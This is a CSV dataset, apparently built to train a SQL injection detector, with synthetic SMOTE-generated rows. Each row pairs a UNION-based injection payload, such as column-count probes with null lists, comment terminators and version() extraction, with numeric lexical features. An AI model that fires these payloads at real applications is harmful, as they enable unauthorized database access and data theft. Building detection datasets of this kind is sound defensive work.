id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000155,attack,union,"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",nearest_attack_euclidean,R000642,0.33224414864117513,65.48890048227108,21.39556019290843,3.77234586509545,14.0,22.79112038581686,18.0,10.697780096454215,0.21404800030048263,0.3474413707932652,0.27520457181490626,0.16330605709134582,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.697780096454215,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R000529,0.11442380793119855,76.0,21.759201132421722,3.692837602842952,14.0,32.0,18.0,12.0,0.18421052631578946,0.42105263157894735,0.23684210526315788,0.15789473684210525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000528,0.3062619094480128,67.0,16.0,3.1557013065098882,41.21302973591778,1.0,14.786970264082221,10.0,0.615119846804743,0.014925373134328318,0.22070104871764507,0.14925373134328357,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1967425660205553,0.0,0.0,5.803257433979445,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,union,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",nearest_attack_euclidean,R000339,0.38673524206664384,77.00664937556397,24.800664937556398,3.9722519725491483,19.0,34.40531950045118,14.0,9.601329875112794,0.24745435000262056,0.4457495621015116,0.18233478421245725,0.12446130368341057,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.6013298751127945,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000159,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000649,0.06556276879037365,55.0,19.296373962876842,3.7559740030138222,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727272,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R000160,0.0,74.0,22.0,3.531597469539237,14.0,44.0,4.0,12.0,0.18918918918918917,0.5945945945945946,0.05405405405405406,0.16216216216216217,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000311,0.5464020886013359,61.54576452728824,16.0,3.2203059092693653,40.90847094542352,1.0,9.637293581864725,10.0,0.6652340925122895,0.016251427393367573,0.15600020616066673,0.16251427393367618,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.2728822636441206,0.0,0.0,5.727117736355879,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R000574,0.276105747948864,64.13409265673813,20.826818531347627,3.6345384074765845,14.0,24.0,17.307274125390506,8.826818531347627,0.21849300071940161,0.3745594298046884,0.2693741411100248,0.13757342836588526,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.8268185313476266,0.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000163,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.1300201953125561,69.30604556491878,15.0,2.9419809170778266,53.44483645193502,1.0,4.0,10.861209112983754,0.7710680756181396,0.014465962190930215,0.05786384876372075,0.15660211342720942,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.861209112983754,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000604,0.20528599741752532,81.0,20.505807147794236,3.509043596112192,14.0,40.0,14.0,13.0,0.1728395061728395,0.49382716049382713,0.1728395061728395,0.16049382716049382,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000194,0.4287619652680293,70.87097684564824,25.93548842282412,3.939608161224906,20.40323263423618,28.0,14.46774421141206,8.0,0.28689525535384525,0.3959368809188499,0.2040430406076335,0.1131248231196714,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000166,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000678,0.5375631072943643,78.54609108730808,28.981563565076765,4.123898225254965,29.0,26.036872869846466,15.0,8.509218217461616,0.36958469110917247,0.3310097712821536,0.1911644954012961,0.10824104220737787,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.5092182174616164,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000167,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000257,0.0,64.0,21.0,3.789609031522995,14.0,36.0,4.0,10.0,0.21875,0.5625,0.0625,0.15625,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000755,0.19902390992295235,70.92945983648981,15.929459836489809,2.9952061397145258,54.0,1.0,4.0,11.92945983648981,0.7613298126417606,0.014098700234106726,0.05639480093642674,0.16817668618770598,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9294598364898099,0.0,9.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,union," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,0.014176057535324756,76.94693275784616,27.0,3.8960013528271125,40.0,3.0,23.946932757846156,10.0,0.5198432484084337,0.038988243630632524,0.3112076958588254,0.12996081210210841,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,0.5254868536141221,74.48418834242764,21.49683766848553,3.589387273055451,14.0,32.99367533697106,14.993675336971059,12.49683766848553,0.18855375393055773,0.44309800089841317,0.20067174584483896,0.1676764993261901,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.2484188342427647,1.0,0.0,6.248418834242765,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,union,"1'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000726,0.24740883111271678,61.73841460104838,16.0,3.200505052097318,32.99073168083871,1.0,18.0,9.747682920209677,0.5340202516303212,0.016218277339614562,0.29192899211306217,0.15783247891700214,1.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.747682920209676,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000683,0.681564528025534,58.929389324943884,22.357633594966327,3.8928544201485926,14.0,28.0,7.143511459955104,9.785877864988777,0.2378753180153896,0.47575063603077916,0.120356234241744,0.16601781171208718,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7858778649887763,1.0,0.0,5.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.7858778649887762,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,0.23812592432629348,63.03929494164876,22.0,3.738410428896071,14.0,24.83143595331901,14.0,10.207858988329752,0.2223037724643518,0.39350167320804247,0.2223037724643518,0.16189078186325398,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.207858988329753,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",nearest_attack_euclidean,R000768,0.0030328674016777543,78.98365840578234,22.0,3.723807661790113,14.0,43.98692672462587,8.0,12.996731681156467,0.17725432472101393,0.5569083546683238,0.1012881855548651,0.1645491350557972,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.996731681156467,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000431,0.32308450475474837,67.31394995693125,17.0,3.250619798077356,36.651159965545,1.0,18.0,11.66278999138625,0.544157594940946,0.014874558433665946,0.26774205180598676,0.1732257948194013,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,4.66278999138625,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R000657,0.629265642158608,65.91077712719454,19.591077712719454,3.554911116277445,14.0,36.72862170175563,4.0,11.182155425438907,0.21363074290935158,0.5558505795321697,0.06103735511695757,0.1694813224415212,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.182155425438907,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"-4068'   )    )     )   union all select 9491,9491,9491--",nearest_attack_euclidean,R000401,0.1094156258622891,57.0,21.0,3.671071815705506,14.0,16.26540629533352,17.73459370466648,9.0,0.24561403508771928,0.2853580051812898,0.3111332228888856,0.15789473684210525,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.93364842616662,0.0,0.0,2.06635157383338,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.13823311423651943,80.85766424916956,28.0,3.992066913655135,40.0,3.857664249169561,23.85766424916956,13.14233575083044,0.49470577623969403,0.04769138073858889,0.29504426885843593,0.16255857416328107,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.85766424916956,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000179,attack,union,"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",nearest_attack_euclidean,R000599,0.45036771858809255,67.45989687779682,27.0,4.046747641615258,25.0,19.08020624440635,17.37969063339047,6.0,0.37064732382761834,0.28318751477812876,0.25720980367562457,0.08895535771862839,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.2299484388984117,0.0,0.0,0.7700515611015883,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,union,1   )    )    as myxo where 1759  =  1759 union all select null#,nearest_attack_euclidean,R000731,0.035098493970170966,64.1279328383507,24.02842951963349,3.7641024569556123,28.943140960733018,9.156362357984195,22.0,4.02842951963349,0.45155200538842954,0.14252050414508394,0.343147576531739,0.06277991393474755,0.0,0.0,0.014214759816745026,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.01421475981674547,1.014214759816745,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000313,0.031220699226809857,67.83792336671623,16.0,3.1810098173345454,37.87033869337298,1.0,18.0,10.967584673343245,0.5582030679771582,0.014743715367246446,0.26538687661043603,0.16166634004515926,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.967584673343245,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,union,"-1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#",nearest_attack_euclidean,R000766,0.3257225916218803,69.44283373435886,21.0,3.642989298081728,14.0,26.75426698748709,18.0,10.688566746871771,0.20183532388369096,0.38479590515354994,0.25950255927903126,0.15386621168372777,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.688566746871772,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000183,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000744,0.03652628940006126,82.0,21.0,3.704608351747655,14.0,40.0,14.0,14.0,0.17073170731707318,0.4878048780487805,0.17073170731707318,0.17073170731707318,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000296,0.27764805769641987,66.0,20.75201026712348,3.651819049480425,14.0,28.0,14.0,10.0,0.21212121212121213,0.42424242424242425,0.21212121212121213,0.15151515151515152,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000185,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000559,1.040209046687093,69.3058489998841,26.882311249855135,4.14328788447364,32.38830200023178,15.341084749681299,15.0,6.576462249971027,0.4693503933192805,0.21927686298711163,0.21660968362449828,0.09476306006910955,1.0,0.0,0.5764622499710272,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0000000000000004,2.5764622499710272,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000186,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000554,0.2495154768084046,70.47119809127528,26.64746539418352,3.986800606143827,23.942396182550564,24.705069211632956,15.647465394183522,6.17626730290824,0.3392978824936222,0.35102550949364814,0.22192023063931762,0.08775637737341203,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.176267302908239,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000187,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000112,0.15658272140326351,76.0,26.235791032194218,3.9131295409981894,40.0,2.0000000000000018,23.0,11.0,0.5263157894736842,0.026315789473684237,0.3026315789473684,0.14473684210526316,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.764208967805782,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000188,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.04441288342856605,70.04643066929158,15.0,3.051570418291685,49.90713866141685,1.0,8.139292007874722,11.0,0.712535351752897,0.01427650185133103,0.11614662603113056,0.1570415203646414,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.023215334645787,0.0,0.0,7.976784665354213,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
